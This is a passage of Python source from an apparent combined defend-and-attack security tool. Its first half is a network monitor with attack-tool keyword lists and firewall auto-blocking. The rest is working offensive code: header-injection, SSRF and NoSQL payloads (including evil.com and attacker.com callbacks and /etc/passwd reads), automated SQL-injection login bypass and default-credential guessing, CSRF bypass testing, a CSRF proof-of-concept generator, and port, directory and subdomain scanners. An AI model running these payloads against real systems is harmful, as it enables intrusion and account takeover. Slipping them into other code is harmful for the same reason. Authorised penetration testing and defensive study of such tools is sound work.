        5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 27017: 'MongoDB',
        31337: 'BackOrifice', 12345: 'NetBus', 54321: 'BackOrifice2K',
    }
    
    # Attack detection thresholds
    SCAN_THRESHOLD_PORTS = 15  # Unique ports in time window = port scan
    SCAN_THRESHOLD_TIME = 30  # Time window in seconds
    BRUTE_FORCE_THRESHOLD = 10  # Connections to auth ports in time window
    BRUTE_FORCE_TIME = 60  # Time window in seconds
    
    # Attack technique mappings
    ATTACK_TECHNIQUES = {
        'port_scan': {'id': 'T1046', 'name': 'Network Service Scanning', 'category': 'reconnaissance'},
        'brute_force': {'id': 'T1110', 'name': 'Brute Force', 'category': 'credential_access'},
        'c2_connection': {'id': 'T1071', 'name': 'Command and Control', 'category': 'command_control'},
        'lateral_movement': {'id': 'T1021', 'name': 'Remote Services', 'category': 'lateral_movement'},
        'exploitation': {'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'category': 'initial_access'},
    }
    
    MALICIOUS_IPS = set()
    SUSPICIOUS_PATTERNS = [
        'nmap', 'masscan', 'nikto', 'sqlmap', 'hydra', 'medusa',
        'metasploit', 'cobalt', 'beacon', 'mimikatz', 'powershell -enc',
        'meterpreter', 'reverse_tcp', 'bind_shell', 'nc.exe', 'netcat'
    ]
    
    # Defense response levels
    RESPONSE_LEVELS = {
        'observe': 0,    # Log only
        'warn': 1,       # Log + alert
        'throttle': 2,   # Slow down / tarpit
        'block_temp': 3, # Temporary block (TTL)
        'block_perm': 4, # Permanent block + firewall
        'counter': 5     # Active countermeasures
    }
    
    def __init__(self, kb: 'KnowledgeBase' = None):
        super().__init__()
        self.kb = kb
        self.running = False
        self.defense_mode = False
        self.learning_mode = True
        self.auto_defend = True  # NEW: Automatic defense responses
        self.response_level = 3  # Default: block_temp
        self.connection_history = []
        self.threat_log = []
        self.blocked_ips = set()
        
        # NEW: Behavioral tracking for each IP
        self.ip_behavior = defaultdict(lambda: {
            'ports_accessed': [],
            'connection_times': [],
            'failed_auths': 0,
            'threat_score': 0.0,
            'last_action': None,
            'action_time': None
        })
        
        # Load known malicious IPs from KB
        if self.kb:
            try:
                self.MALICIOUS_IPS = set(self.kb.get_malicious_ips(3.0))
            except:
                pass
        
        self.stats = {
            'total_connections': 0,
            'threats_detected': 0,
            'attacks_blocked': 0,
            'scans_detected': 0,
            'brute_force_detected': 0,
            'unique_ips': set(),
            'start_time': None
        }
        
    def run(self):
        self.running = True
        self.stats['start_time'] = datetime.now()
        self.status_update.emit("🛡️ Network Monitor ACTIVE - Watching connections...")
        
        while self.running:
            try:
                connections = self._get_connections()
                for conn in connections:
                    self._analyze_connection(conn)
                    
                self._emit_stats()
                time.sleep(1)
            except Exception as e:
                self.status_update.emit(f"Monitor error: {str(e)}")
                time.sleep(5)
                
    def stop(self):
        self.running = False
        self.status_update.emit("🔴 Network Monitor STOPPED")
        
    def _get_connections(self) -> List[Dict]:
        import psutil
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED' or conn.status == 'LISTEN':
                    conn_info = {
                        'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
                        'local_port': conn.laddr.port if conn.laddr else 0,
                        'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                        'remote_ip': conn.raddr.ip if conn.raddr else None,
                        'remote_port': conn.raddr.port if conn.raddr else 0,
                        'status': conn.status,
                        'pid': conn.pid,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    if conn.pid:
                        try:
                            proc = psutil.Process(conn.pid)
                            conn_info['process'] = proc.name()
                            conn_info['cmdline'] = ' '.join(proc.cmdline()[:3])
                        except:
                            conn_info['process'] = 'Unknown'
                            conn_info['cmdline'] = ''
                    
                    connections.append(conn_info)
                    self.stats['total_connections'] += 1
                    if conn_info['remote_ip']:
                        self.stats['unique_ips'].add(conn_info['remote_ip'])
        except Exception as e:
            pass
            
        return connections
        
    def _analyze_connection(self, conn: Dict):
        threat_level = 'SAFE'
        threat_type = None
        threat_details = []
        attack_technique = None
        
        remote_port = conn.get('remote_port', 0)
        remote_ip = conn.get('remote_ip')
        local_port = conn.get('local_port', 0)
        process = conn.get('process', '')
        cmdline = conn.get('cmdline', '')
        
        # Update behavioral tracking for this IP
        if remote_ip:
            self._update_ip_behavior(remote_ip, local_port, conn)
            
            # Check for behavioral patterns (port scan, brute force)
            behavior_threat = self._detect_behavioral_attack(remote_ip)
            if behavior_threat:
                threat_level = behavior_threat['level']
                threat_type = behavior_threat['type']
                threat_details.extend(behavior_threat['details'])
                attack_technique = behavior_threat.get('technique')
        
        # Check against known bad IPs
        if remote_ip in self.blocked_ips or remote_ip in self.MALICIOUS_IPS:
            threat_level = 'CRITICAL'
            threat_type = 'BLOCKED_IP'
            threat_details.append(f"Connection from blocked IP: {remote_ip}")
        
        # Check IP reputation from knowledge base
        if remote_ip and self.kb:
            ip_rep = self.kb.get_ip_reputation(remote_ip)
            if ip_rep and ip_rep['threat_score'] >= 5.0:
                threat_level = 'HIGH'
                threat_type = threat_type or 'KNOWN_THREAT'
                threat_details.append(f"Known threat: score={ip_rep['threat_score']:.1f}, attacks={ip_rep['attack_count']}")
            
        if remote_port in self.THREAT_PORTS:
            if threat_level not in ['CRITICAL', 'HIGH']:
                threat_level = 'WARNING'
            threat_type = threat_type or 'SUSPICIOUS_PORT'
            threat_details.append(f"Connection to sensitive port: {remote_port} ({self.THREAT_PORTS[remote_port]})")
            
        if local_port in self.THREAT_PORTS and conn['status'] == 'LISTEN':
            if threat_level == 'SAFE':
                threat_level = 'WARNING'
            threat_type = threat_type or 'OPEN_SENSITIVE_PORT'
            threat_details.append(f"Listening on sensitive port: {local_port} ({self.THREAT_PORTS[local_port]})")
            
        for pattern in self.SUSPICIOUS_PATTERNS:
            if pattern.lower() in cmdline.lower() or pattern.lower() in process.lower():
                threat_level = 'HIGH'
                threat_type = 'SUSPICIOUS_PROCESS'
                threat_details.append(f"Suspicious process pattern: {pattern}")
                attack_technique = self.ATTACK_TECHNIQUES.get('exploitation')
                break
                
        if remote_port in [4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345]:
            threat_level = 'HIGH'
            threat_type = 'POTENTIAL_C2'
            threat_details.append(f"Potential C2/backdoor port: {remote_port}")
            attack_technique = self.ATTACK_TECHNIQUES.get('c2_connection')
            
        conn['threat_level'] = threat_level
        conn['threat_type'] = threat_type
        conn['threat_details'] = threat_details
        conn['attack_technique'] = attack_technique
        
        if threat_level != 'SAFE':
            self.stats['threats_detected'] += 1
            self.threat_log.append(conn)
            self.threat_detected.emit(conn)
            
            if self.learning_mode and self.kb:
                self._learn_from_threat(conn, attack_technique)
                
            # Auto-defense based on threat level
            if self.auto_defend and self.defense_mode:
                self._auto_respond(conn, threat_level, threat_type, attack_technique)
        else:
            self.connection_detected.emit(conn)
            
        self.connection_history.append(conn)
        if len(self.connection_history) > 1000:
            self.connection_history = self.connection_history[-500:]
    
    def _update_ip_behavior(self, ip: str, port: int, conn: Dict):
        """Track connection behavior for each IP"""
        now = time.time()
        behavior = self.ip_behavior[ip]
        
        # Add this connection
        behavior['ports_accessed'].append((port, now))
        behavior['connection_times'].append(now)
        
        # Clean old entries (outside time windows)
        cutoff_scan = now - self.SCAN_THRESHOLD_TIME
        cutoff_brute = now - self.BRUTE_FORCE_TIME
        
        behavior['ports_accessed'] = [(p, t) for p, t in behavior['ports_accessed'] if t > cutoff_scan]
        behavior['connection_times'] = [t for t in behavior['connection_times'] if t > cutoff_brute]
    
    def _detect_behavioral_attack(self, ip: str) -> Optional[Dict]:
        """Detect behavioral attacks like port scans and brute force"""
        behavior = self.ip_behavior[ip]
        
        # Check for port scan
        unique_ports = set(p for p, t in behavior['ports_accessed'])
        if len(unique_ports) >= self.SCAN_THRESHOLD_PORTS:
            self.stats['scans_detected'] += 1
            behavior['threat_score'] += 2.0
            return {
                'level': 'HIGH',
                'type': 'PORT_SCAN',
                'technique': self.ATTACK_TECHNIQUES['port_scan'],
                'details': [f"Port scan detected: {len(unique_ports)} ports in {self.SCAN_THRESHOLD_TIME}s",
                           f"Ports: {sorted(list(unique_ports))[:10]}..."]
            }
        
        # Check for brute force (many connections to auth ports)
        auth_ports = {22, 23, 21, 3389, 5900, 445, 3306, 5432, 1433}
        auth_connections = sum(1 for p, t in behavior['ports_accessed'] if p in auth_ports)
        if auth_connections >= self.BRUTE_FORCE_THRESHOLD:
            self.stats['brute_force_detected'] += 1
            behavior['threat_score'] += 3.0
            return {
                'level': 'CRITICAL',
                'type': 'BRUTE_FORCE',
                'technique': self.ATTACK_TECHNIQUES['brute_force'],
                'details': [f"Brute force attack detected: {auth_connections} auth attempts in {self.BRUTE_FORCE_TIME}s"]
            }
        
        # Check accumulated threat score
        if behavior['threat_score'] >= 5.0:
            return {
                'level': 'HIGH',
                'type': 'SUSPICIOUS_BEHAVIOR',
                'details': [f"Accumulated threat score: {behavior['threat_score']:.1f}"]
            }
        
        return None
    
    def _auto_respond(self, conn: Dict, threat_level: str, threat_type: str, technique: Dict = None):
        """Automatically respond to threats based on severity"""
        remote_ip = conn.get('remote_ip')
        if not remote_ip:
            return
        
        response_action = None
        response_details = []
        
        # Determine response based on threat level
        if threat_level == 'CRITICAL':
            response_action = 'block_perm'
            response_details.append(f"Permanent block for CRITICAL threat: {threat_type}")
            self._apply_firewall_block(remote_ip, permanent=True)
            self._kill_connection(conn)
            
        elif threat_level == 'HIGH':
            response_action = 'block_temp'
            response_details.append(f"Temporary block for HIGH threat: {threat_type}")
            self._apply_firewall_block(remote_ip, permanent=False, ttl=3600)
            
        elif threat_level == 'WARNING':
            response_action = 'warn'
            response_details.append(f"Warning logged for: {threat_type}")
        
        # Add to blocked list
        if response_action in ['block_perm', 'block_temp']:
            self.blocked_ips.add(remote_ip)
            self.MALICIOUS_IPS.add(remote_ip)
            self.stats['attacks_blocked'] += 1
            
            # Update KB
            if self.kb:
                self.kb.block_ip(remote_ip, f"Auto-blocked: {threat_type}")
                self.kb.log_attack_event(
                    event_type=threat_type,
                    src_ip=remote_ip,
                    dst_port=conn.get('local_port', 0),
                    severity=threat_level,
                    evidence={'details': conn.get('threat_details', [])},
                    action_taken=response_action,
                    technique_id=technique['id'] if technique else None
                )
        
        # Emit response signal
        self.auto_response.emit({
            'ip': remote_ip,
            'action': response_action,
            'threat_type': threat_type,
            'threat_level': threat_level,
            'details': response_details,
            'technique': technique
        })
        
        self.status_update.emit(f"⚔️ AUTO-DEFENSE: {response_action.upper()} on {remote_ip} ({threat_type})")
    
    def _apply_firewall_block(self, ip: str, permanent: bool = False, ttl: int = 3600):
        """Apply OS-level firewall block"""
        import platform
        os_type = platform.system().lower()
        
        try:
            if os_type == 'windows':
                rule_name = f"HADES_BLOCK_{ip.replace('.', '_')}"
                cmd = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=block remoteip={ip}'
                import subprocess
                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                self.status_update.emit(f"🛡️ Firewall: Blocked {ip} (Windows)")
                
            elif os_type == 'linux':
                cmd = f'iptables -A INPUT -s {ip} -j DROP'
                import subprocess
                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                self.status_update.emit(f"🛡️ Firewall: Blocked {ip} (Linux)")
                
            elif os_type == 'darwin':
                # macOS - requires pfctl setup
                self.status_update.emit(f"🛡️ Block request for {ip} (macOS - manual pfctl needed)")
                
        except Exception as e:
            self.status_update.emit(f"⚠️ Firewall block failed for {ip}: {str(e)[:50]}")
    
    def _kill_connection(self, conn: Dict):
        """Kill an active connection by terminating the associated process"""
        pid = conn.get('pid')
        if not pid:
            return
        
        try:
            import psutil
            proc = psutil.Process(pid)
            proc_name = proc.name()
            
            # Safety check - don't kill system processes
            safe_to_kill = proc_name.lower() not in [
                'system', 'svchost.exe', 'csrss.exe', 'wininit.exe', 
                'services.exe', 'lsass.exe', 'explorer.exe', 'init', 'systemd'
            ]
            
            if safe_to_kill:
                proc.terminate()
                self.status_update.emit(f"🔥 Terminated process: {proc_name} (PID: {pid})")
        except Exception as e:
            pass
            
    def _learn_from_threat(self, conn: Dict, technique: Dict = None):
        """Learn from detected threats and update knowledge base"""
        if not self.kb:
            return
            
        # Store as threat finding
        finding = ThreatFinding(
            path=f"Network:{conn.get('remote_addr', 'Unknown')}",
            threat_type=conn.get('threat_type', 'network_threat'),
            pattern=f"Port:{conn.get('remote_port')} Process:{conn.get('process', 'Unknown')}",
            severity=conn.get('threat_level', 'MEDIUM'),
            code_snippet=str(conn.get('threat_details', [])),
            browser='Network Monitor',
            context=f"PID:{conn.get('pid')} CMD:{conn.get('cmdline', '')[:100]}"
        )
        self.kb.store_threat_finding(finding)
        
        # Add to malicious IPs
        if conn.get('remote_ip'):
            self.MALICIOUS_IPS.add(conn['remote_ip'])
        
        # Store/update the attack technique
        if technique:
            mitigations = []
            if technique['id'] == 'T1046':  # Port scan
                mitigations = [
                    "Enable firewall rules to block port scanning",
                    "Implement port knocking for sensitive services",
                    "Use intrusion detection systems (IDS)"
                ]
            elif technique['id'] == 'T1110':  # Brute force
                mitigations = [
                    "Implement account lockout policies",
                    "Use multi-factor authentication",
                    "Limit login attempts with fail2ban or similar",
                    "Use strong password policies"
                ]
            elif technique['id'] == 'T1071':  # C2
                mitigations = [
                    "Block known C2 ports at firewall",
                    "Monitor for unusual outbound connections",
                    "Implement egress filtering"
                ]
            
            self.kb.store_technique(
                technique_id=technique['id'],
                name=technique['name'],
                category=technique['category'],
                description=f"Detected via network monitoring",
                indicators=[conn.get('threat_type', ''), f"Port: {conn.get('remote_port')}"],
                mitigations=mitigations,
                detection_rules=[f"Monitor for {technique['name']} patterns"],
                confidence=0.8
            )
                
    def _counter_attack(self, conn: Dict):
        remote_ip = conn.get('remote_ip')
        if not remote_ip:
            return
            
        self.blocked_ips.add(remote_ip)
        self.stats['attacks_blocked'] += 1
        
        self.status_update.emit(f"⚔️ COUNTER: Blocked {remote_ip} - {conn.get('threat_type')}")
        
        try:
            pid = conn.get('pid')
            if pid:
                import psutil
                try:
                    proc = psutil.Process(pid)
                    if conn.get('threat_level') == 'CRITICAL':
                        proc.terminate()
                        self.status_update.emit(f"🔥 Terminated malicious process: {proc.name()} (PID: {pid})")
                except:
                    pass
        except:
            pass
            
    def _emit_stats(self):
        runtime = datetime.now() - self.stats['start_time'] if self.stats['start_time'] else None
        self.stats_update.emit({
            'total_connections': self.stats['total_connections'],
            'threats_detected': self.stats['threats_detected'],
            'attacks_blocked': self.stats['attacks_blocked'],
            'unique_ips': len(self.stats['unique_ips']),
            'blocked_ips': len(self.blocked_ips),
            'runtime': str(runtime).split('.')[0] if runtime else '00:00:00',
            'defense_mode': self.defense_mode,
            'learning_mode': self.learning_mode
        })
        
    def set_defense_mode(self, enabled: bool):
        self.defense_mode = enabled
        mode = "ENABLED" if enabled else "DISABLED"
        self.status_update.emit(f"🛡️ Active Defense {mode}")
        
    def set_learning_mode(self, enabled: bool):
        self.learning_mode = enabled
        mode = "ENABLED" if enabled else "DISABLED"
        self.status_update.emit(f"🧠 Learning Mode {mode}")
        
    def block_ip(self, ip: str):
        self.blocked_ips.add(ip)
        self.status_update.emit(f"🚫 Manually blocked IP: {ip}")
        
    def unblock_ip(self, ip: str):
        self.blocked_ips.discard(ip)
        self.status_update.emit(f"✅ Unblocked IP: {ip}")
        
    def get_threat_log(self) -> List[Dict]:
        return self.threat_log[-100:]
        
    def get_blocked_ips(self) -> List[str]:
        return list(self.blocked_ips)


# ============================================================================
# REQUEST INJECTION ENGINE
# ============================================================================

class RequestInjector:
    def __init__(self, proxy_manager: ProxyManager = None):
        self.proxy = proxy_manager or ProxyManager()
        
    HEADER_INJECTIONS = {
        'host': ['evil.com', 'localhost', '127.0.0.1', 'internal.target'],
        'x-forwarded-for': ['127.0.0.1', '10.0.0.1', 'localhost', '::1'],
        'x-forwarded-host': ['evil.com', 'localhost'],
        'x-original-url': ['/admin', '/internal', '/../../../etc/passwd'],
        'x-rewrite-url': ['/admin', '/api/internal'],
        'x-custom-ip-authorization': ['127.0.0.1'],
        'x-real-ip': ['127.0.0.1', '10.0.0.1'],
        'referer': ['https://trusted-site.com', 'https://target.com/admin'],
        'origin': ['https://evil.com', 'null'],
        'content-type': ['application/json', 'application/xml', 'text/xml'],
        'accept': ['application/json', '../../../etc/passwd'],
    }
    
    JSON_PAYLOADS = {
        'type_juggling': [
            {'password': True},
            {'password': 0},
            {'password': []},
            {'password': None},
            {'id': {'$gt': ''}},  # NoSQL
        ],
        'injection': [
            {'username': "admin'--", 'password': 'x'},
            {'username': {'$ne': ''}, 'password': {'$ne': ''}},  # NoSQL bypass
            {'__proto__': {'admin': True}},  # Prototype pollution
            {'constructor': {'prototype': {'admin': True}}},
        ],
        'ssrf': [
            {'url': 'http://127.0.0.1:80'},
            {'url': 'http://169.254.169.254/latest/meta-data/'},
            {'url': 'file:///etc/passwd'},
            {'webhook': 'http://attacker.com/callback'},
        ]
    }
    
    WAF_BYPASS_HEADERS = {
        'standard': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        },
        'googlebot': {
            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        },
        'bypass_waf': {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Host': '127.0.0.1',
            'X-Forwarded-Host': '127.0.0.1',
        }
    }
    
    def inject_headers(self, url: str, test_headers: Dict = None) -> List[Dict]:
        if not HAS_REQUESTS:
            return [{'error': 'requests not installed'}]
            
        results = []
        session = self.proxy.get_session()
        test_headers = test_headers or self.HEADER_INJECTIONS
        
        # Baseline request
        try:
            baseline = session.get(url, timeout=10, verify=False)
            baseline_len = len(baseline.content)
            baseline_status = baseline.status_code
        except:
            baseline_len = 0
            baseline_status = 0
        
        for header, values in test_headers.items():
            for value in values:
                try:
                    headers = {header: value}
                    r = session.get(url, headers=headers, timeout=10, verify=False)
                    
                    diff = abs(len(r.content) - baseline_len)
                    interesting = (r.status_code != baseline_status or 
                                  diff > 100 or 
                                  r.status_code in [200, 302, 403, 500])
                    
                    results.append({
                        'header': header,
                        'value': value,
                        'status': r.status_code,
                        'length': len(r.content),
                        'diff': diff,
                        'interesting': interesting
                    })
                except Exception as e:
                    results.append({'header': header, 'value': value, 'error': str(e)})
                    
        return results
    
    def inject_json(self, url: str, payload_type: str = 'injection') -> List[Dict]:
        if not HAS_REQUESTS:
            return [{'error': 'requests not installed'}]
            
        results = []
        session = self.proxy.get_session()
        payloads = self.JSON_PAYLOADS.get(payload_type, self.JSON_PAYLOADS['injection'])
        
        for payload in payloads:
            try:
                r = session.post(url, json=payload, timeout=10, verify=False)
                results.append({
                    'payload': str(payload),
                    'status': r.status_code,
                    'length': len(r.content),
                    'response_preview': r.text[:200]
                })
            except Exception as e:
                results.append({'payload': str(payload), 'error': str(e)})
                
        return results


# ============================================================================
# CSRF & LOGIN BYPASS
# ============================================================================

class AuthBypass:
    LOGIN_BYPASS_PAYLOADS = {
        'sql_auth_bypass': [
            ("admin'--", "x"),
            ("' OR '1'='1'--", "x"),
            ("admin' OR '1'='1", "x"),
            ("' OR 1=1--", "x"),
            ("admin'/*", "x"),
            ("') OR ('1'='1", "x"),
            ("admin' #", "x"),
            ("' OR ''='", "x"),
        ],
        'default_creds': [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "toor"),
            ("administrator", "administrator"),
            ("test", "test"),
            ("guest", "guest"),
            ("admin", "admin123"),
            ("admin", "Password1"),
        ],
        'nosql_bypass': [
            ({"$gt": ""}, {"$gt": ""}),
            ({"$ne": ""}, {"$ne": ""}),
            ({"$regex": ".*"}, {"$regex": ".*"}),
        ]
    }
    
    CSRF_BYPASS_TECHNIQUES = [
        {'name': 'Remove Token', 'action': 'remove_csrf_token'},
        {'name': 'Empty Token', 'action': 'empty_token'},
        {'name': 'Random Token', 'action': 'random_token'},
        {'name': 'Reuse Token', 'action': 'reuse_token'},
        {'name': 'Change Method', 'action': 'change_method'},
        {'name': 'Remove Referer', 'action': 'remove_referer'},
        {'name': 'Change Content-Type', 'action': 'change_content_type'},
    ]
    
    def __init__(self, proxy_manager: ProxyManager = None):
        self.proxy = proxy_manager or ProxyManager()
        
    def try_login_bypass(self, url: str, user_field: str = 'username', 
                         pass_field: str = 'password', bypass_type: str = 'sql_auth_bypass') -> List[Dict]:
        if not HAS_REQUESTS:
            return [{'error': 'requests not installed'}]
            
        results = []
        session = self.proxy.get_session()
        payloads = self.LOGIN_BYPASS_PAYLOADS.get(bypass_type, [])
        
        # Get baseline
        try:
            baseline = session.post(url, data={user_field: 'invalid', pass_field: 'invalid'}, 
                                   timeout=10, verify=False, allow_redirects=False)
            baseline_status = baseline.status_code
            baseline_len = len(baseline.content)
        except:
            baseline_status = 0
            baseline_len = 0
        
        for user_payload, pass_payload in payloads:
            try:
                data = {user_field: user_payload, pass_field: pass_payload}
                r = session.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
                
                # Check for success indicators
                success_indicators = [
                    r.status_code in [302, 303],  # Redirect after login
                    r.status_code != baseline_status,
                    abs(len(r.content) - baseline_len) > 200,
                    'dashboard' in r.text.lower(),
                    'welcome' in r.text.lower(),
                    'logout' in r.text.lower(),
                    'set-cookie' in str(r.headers).lower() and 'session' in str(r.headers).lower(),
                ]
                
                results.append({
                    'username': str(user_payload),
                    'password': str(pass_payload),
                    'status': r.status_code,
                    'length': len(r.content),
                    'potential_bypass': any(success_indicators),
                    'redirect': r.headers.get('Location', '')
                })
            except Exception as e:
                results.append({'username': str(user_payload), 'error': str(e)})
                
        return results
    
    def test_csrf_bypass(self, url: str, method: str = 'POST', 
                         original_data: Dict = None) -> List[Dict]:
        if not HAS_REQUESTS:
            return [{'error': 'requests not installed'}]
            
        results = []
        session = self.proxy.get_session()
        original_data = original_data or {}
        
        for technique in self.CSRF_BYPASS_TECHNIQUES:
            try:
                data = original_data.copy()
                headers = {}
                
                if technique['action'] == 'remove_csrf_token':
                    data.pop('csrf_token', None)
                    data.pop('_token', None)
                    data.pop('csrfmiddlewaretoken', None)
                elif technique['action'] == 'empty_token':
                    for key in ['csrf_token', '_token', 'csrfmiddlewaretoken']:
                        if key in data:
                            data[key] = ''
                elif technique['action'] == 'random_token':
                    for key in ['csrf_token', '_token', 'csrfmiddlewaretoken']:
                        if key in data:
                            data[key] = hashlib.md5(os.urandom(16)).hexdigest()
                elif technique['action'] == 'remove_referer':
                    headers['Referer'] = ''
                elif technique['action'] == 'change_content_type':
                    headers['Content-Type'] = 'text/plain'
                
                if method.upper() == 'POST':
                    r = session.post(url, data=data, headers=headers, timeout=10, 
                                    verify=False, allow_redirects=False)
                else:
                    r = session.get(url, params=data, headers=headers, timeout=10, 
                                   verify=False, allow_redirects=False)
                
                results.append({
                    'technique': technique['name'],
                    'status': r.status_code,
                    'length': len(r.content),
                    'success': r.status_code in [200, 302, 303]
                })
            except Exception as e:
                results.append({'technique': technique['name'], 'error': str(e)})
                
        return results
    
    def generate_csrf_poc(self, url: str, method: str, data: Dict) -> str:
        form_fields = '\n'.join([
            f'    <input type="hidden" name="{k}" value="{v}" />'
            for k, v in data.items()
        ])
        
        return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <form id="csrf-form" action="{url}" method="{method}">
{form_fields}
    <input type="submit" value="Submit" />
  </form>
  <script>
    // Auto-submit on page load
    // document.getElementById('csrf-form').submit();
  </script>
</body>
</html>'''


class WebLearner:
    EXPLOIT_PATTERNS = {
        'sql_injection': [
            r"(?:UNION\s+SELECT|OR\s+1\s*=\s*1|'\s*OR\s*'|--\s*$|;\s*DROP\s+TABLE)",
            r"(?:SELECT\s+.*\s+FROM|INSERT\s+INTO|UPDATE\s+.*\s+SET|DELETE\s+FROM)",
        ],
        'xss': [
            r"<script[^>]*>.*?</script>",
            r"(?:javascript:|on\w+\s*=)",
            r"(?:document\.cookie|document\.write|\.innerHTML)",
        ],
        'command_injection': [
            r"(?:\|\s*\w+|;\s*\w+|`[^`]+`|\$\([^)]+\))",
            r"(?:system\s*\(|exec\s*\(|shell_exec|passthru|popen)",
        ],
        'path_traversal': [
            r"(?:\.\./|\.\.\\|%2e%2e%2f|%2e%2e/)",
        ],
        'lfi_rfi': [
            r"(?:include\s*\(|require\s*\(|include_once|require_once).*(?:\$_GET|\$_POST|\$_REQUEST)",
        ],
    }
    
    def __init__(self, kb: KnowledgeBase):
        self.kb = kb
        
    def learn_from_url(self, url: str) -> Dict[str, Any]:
        if not HAS_REQUESTS:
            return {'error': 'requests library not installed', 'patterns': [], 'exploits': []}
            
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            content = response.text
            
            patterns_found = []
            exploits_found = []
            
            for exploit_type, patterns in self.EXPLOIT_PATTERNS.items():
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                    for match in matches[:5]:
                        exploit_code = match if isinstance(match, str) else match[0]
                        patterns_found.append({'type': exploit_type, 'pattern': pattern})
                        exploits_found.append({
                            'type': exploit_type,
                            'code': exploit_code[:500],
                            'source': url
                        })
                        self.kb.store_learned_exploit(url, exploit_type, exploit_code[:500], f"Learned from {url}")
            
            code_blocks = re.findall(r'<code[^>]*>(.*?)</code>', content, re.DOTALL | re.IGNORECASE)
            code_blocks += re.findall(r'<pre[^>]*>(.*?)</pre>', content, re.DOTALL | re.IGNORECASE)
            
            for code in code_blocks[:10]:
                clean_code = re.sub(r'<[^>]+>', '', code).strip()
                if len(clean_code) > 20:
                    for exploit_type, patterns in self.EXPLOIT_PATTERNS.items():
                        for pattern in patterns:
                            if re.search(pattern, clean_code, re.IGNORECASE):
                                exploits_found.append({
                                    'type': exploit_type,
                                    'code': clean_code[:500],
                                    'source': url
                                })
                                self.kb.store_learned_exploit(url, exploit_type, clean_code[:500], f"Code block from {url}")
                                break
            
            self.kb.store_web_learning(url, response.headers.get('Content-Type', 'unknown'), patterns_found, exploits_found)
            
            return {
                'url': url,
                'status': response.status_code,
                'patterns_found': len(patterns_found),
                'exploits_learned': len(exploits_found),
                'exploits': exploits_found[:10]
            }
            
        except Exception as e:
            return {'error': str(e), 'patterns': [], 'exploits': []}


# ============================================================================
# TOOL EXECUTOR - Run pentest tools
# ============================================================================

class ToolExecutor(QThread):
    output = pyqtSignal(str)
    finished_task = pyqtSignal(dict)
    progress = pyqtSignal(int)
    
    def __init__(self, tool: str, target: str, options: Dict = None):
        super().__init__()
        self.tool = tool
        self.target = target
        self.options = options or {}
        self._stop = False
        
    def stop(self):
        self._stop = True
        
    def run(self):
        result = {'tool': self.tool, 'target': self.target, 'findings': [], 'error': None}
        
        try:
            if self.tool == 'port_scan':
                result = self._port_scan()
            elif self.tool == 'dir_bruteforce':
                result = self._dir_bruteforce()
            elif self.tool == 'subdomain_enum':
                result = self._subdomain_enum()
            elif self.tool == 'banner_grab':
                result = self._banner_grab()
            elif self.tool == 'vuln_scan':
                result = self._vuln_scan()
        except Exception as e:
            result['error'] = str(e)
            
        self.finished_task.emit(result)
        
    def _port_scan(self) -> Dict:
        host = self.target
        ports = range(1, 1025)
        open_ports = []
        total = len(ports)
        
        self.output.emit(f"[*] Scanning {host} for open ports...")
        
        for i, port in enumerate(ports):
            if self._stop:
                break
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((host, port)) == 0:
                        open_ports.append(port)
                        self.output.emit(f"[+] Port {port} is OPEN")
            except:
                pass
            if i % 100 == 0:
                self.progress.emit(int(i / total * 100))
                
        self.progress.emit(100)
        return {'tool': 'port_scan', 'target': host, 'findings': open_ports, 'error': None}
    
    def _dir_bruteforce(self) -> Dict:
        if not HAS_REQUESTS:
            return {'error': 'requests not installed'}
            
        base_url = self.target
        wordlist = self.options.get('wordlist', [
            'admin', 'login', 'dashboard', 'api', 'config', 'backup', 'test',
            'dev', 'staging', 'old', 'new', 'temp', 'tmp', 'uploads', 'files',
            'images', 'js', 'css', 'assets', 'static', 'media', 'data', 'db',
            'database', 'sql', 'php', 'wp-admin', 'wp-content', 'administrator',
            '.git', '.env', 'robots.txt', 'sitemap.xml', '.htaccess', 'web.config'
        ])
        found = []
        
        self.output.emit(f"[*] Bruteforcing directories on {base_url}...")
        
        for i, path in enumerate(wordlist):
            if self._stop:
                break
            try:
                url = f"{base_url.rstrip('/')}/{path}"
                r = requests.get(url, timeout=3, allow_redirects=False,
                               headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code not in [404]:
                    found.append({'path': path, 'status': r.status_code, 'size': len(r.content)})
                    self.output.emit(f"[+] Found: /{path} (Status: {r.status_code})")
            except:
                pass
            self.progress.emit(int((i + 1) / len(wordlist) * 100))
            
        return {'tool': 'dir_bruteforce', 'target': base_url, 'findings': found, 'error': None}
    
    def _subdomain_enum(self) -> Dict:
        domain = self.target
        subdomains = ['www', 'mail', 'ftp', 'api', 'dev', 'staging', 'test', 'admin',
                      'blog', 'shop', 'store', 'app', 'mobile', 'cdn', 'static', 'assets',
